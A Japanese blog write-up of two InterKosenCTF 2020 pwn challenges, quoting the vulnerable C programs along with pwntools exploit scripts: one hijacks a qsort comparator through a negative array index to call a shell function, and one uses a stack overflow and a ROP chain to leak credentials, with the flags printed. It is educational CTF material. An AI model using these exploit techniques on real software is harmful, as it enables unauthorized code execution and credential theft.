---
title: "InterKosenCTF2020"
date: 2020-09-07T01:14:23+09:00
tags: ["writeup", "kosen"]
draft: true
mathjax: true
---

<div class="section">

InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめました．運営は3人しかいないらしくとても大変そうです．本当にお疲れ様でした．  
では自分が解いた問題のwirteupを書いていこうと思います．

## [pwn: 105pts] babysort (49 solved)
次のプログラムで動いているサービスがあります．

``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef int (*SORTFUNC)(const void*, const void*);

typedef struct {
  long elm[5];
  SORTFUNC cmp[2];
} SortExperiment;

/* call me! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}

int cmp_asc(const void *a, const void *b) { return *(long*)a - *(long*)b; }
int cmp_dsc(const void *a, const void *b) { return *(long*)b - *(long*)a; }

int main(void) {
  SortExperiment se = {.cmp = {cmp_asc, cmp_dsc}};
  int i;

  /* input numbers */
  puts("-*-*- Sort Experiment -*-*-");
  for(i = 0; i < 5; i++) {
    printf("elm[%d] = ", i);
    if (scanf("%ld", &se.elm[i]) != 1) exit(1);
  }

  /* sort */
  printf("[0] Ascending / [1] Descending: ");
  if (scanf("%d", &i) != 1) exit(1);
  qsort(se.elm, 5, sizeof(long), se.cmp[i]);

  /* output result */
  puts("Result:");
  for(i = 0; i < 5; i++) {
    printf("elm[%d] = %ld\n", i, se.elm[i]);
  }
  return 0;
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(300);
}
```

bofかなんかを利用してwin関数に飛べばフラグが取れる問題です．34行目にあるscanfで，負の数値を受け取ることができてしまうことを利用して，qsortのソート用の関数をwinのアドレスにすることで呼び出すことができます．  
  
構造体はそのメンバ順にメモリにマップされるため，se.cmpの一つ後ろのアドレスにse.elmの一番後ろのアドレスが位置しています．そのため，最初の入力でse.elmの一番最後の要素にwinのアドレスを入れておけば，se.cmp[-1]をqsortに渡すことでwinを呼び出すことができます．  
ソルバどぺー  

``` python
from pwn import *

win_addr = 0x00400787

r = remote("pwn.kosenctf.com", 9001)

r.sendline("0")
r.sendline("0")
r.sendline("0")
r.sendline("0")
r.sendline(str(win_addr))
r.sendline("-1")

r.interactive()

# KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}
```

## [pwn: 300pts] authme (20 solved)
次のコードで動いている実行ファイルと，ダミーのパスワードとユーザー名が渡されます．
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int auth = 1;
char username[0x20];
char password[0x20];

void init(void) {
  FILE *fp;

  /* read secret username */
  if ((fp = fopen("./username", "r")) == NULL) {
    puts("[-] Please report this bug to the admin");
    exit(1);
  }
  fread(username, sizeof(char), 0x20, fp);
  fclose(fp);

  /* read secret password */
  if ((fp = fopen("./password", "r")) == NULL) {
    puts("[-] Please report this bug to the admin");
    exit(1);
  }
  fread(password, sizeof(char), 0x20, fp);
  fclose(fp);
}

int main() {
  char buf[0x20];

  init();

  puts("                _   _     __  __ ______ ");
  puts("     /\\        | | | |   |  \\/  |  ____|");
  puts("    /  \\  _   _| |_| |__ | \\  / | |__   ");
  puts("   / /\\ \\| | | | __| '_ \\| |\\/| |  __|  ");
  puts("  / ____ \\ |_| | |_| | | | |  | | |____ ");
  puts(" /_/    \\_\\__,_|\\__|_| |_|_|  |_|______|\n");

  printf("Username: ");
  if (fgets(buf, 0x40, stdin) == NULL) return 1;
  if (strcmp(buf, username) != 0) auth = 0;

  printf("Password: ");
  if (fgets(buf, 0x40, stdin) == NULL) return 1;
  if (strcmp(buf, password) != 0) auth = 0;

  if (auth == 1) {
    puts("[+] OK!");
    system("/bin/sh");
    exit(0);
  } else {
    puts("[-] NG!");
    exit(1);
  }
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
```

bufの容量が0x20なのにもかかわらず，43，47行目で0x40の長さの文字列が入力できてしまうのが脆弱性になっています．最初はこれに気づけなくて大変でした．    
  
一つ目のfgetsでbofを起こせます．bufの先頭からオフセット0x28の位置にリターンアドレスがあり，この部分でそれをを書き換えることができます．また，そのまま進むとauthが1でも0でもexitしてしまうためリターンアドレスに飛ぶことファできないため，2つ目のfgetsにnullを返させてreturn 1を実行できるようにします．  

1つ目のfgetsで，リターンアドレスを52行目のsystemに飛ばせばそのままシェルが取れるような気がしますが，実はこの部分のアドレスには0x0aが含まれています．これは改行文字でfgetsはそこで入力を終わりにしてしまい，52行目のアドレスを入力しきることができません．そのためpop rdiのガジェットを使ってusernameとpasswordをputsしリークすることを目指します．  
ソルバどぺー  
10行目のコメントを外せばパスワードが取れます．

``` python
from pwn import *

r = remote("pwn.kosenctf.com", 9002)

puts = 0x4006a6
username = 0x6020c0
password = 0x6020e0
pop_rdi = 0x400b03
payload = b"A" * 0x28 + p64(pop_rdi) + p64(username) + p64(puts)[:-1]
# payload = b"A" * 0x28 + p64(pop_rdi) + p64(password) + p64(puts)[:-1]
r.send(payload)

r.recvuntil("Password: ")
r.shutdown("send")

r.interactive()
# username: UnderUltimateUtterUranium
# password: PonPonPainPanicParadigm
# KosenCTF{cl0s3_ur_3y3_4nd_g0_w1th_th3_fl0w}
```

</div>
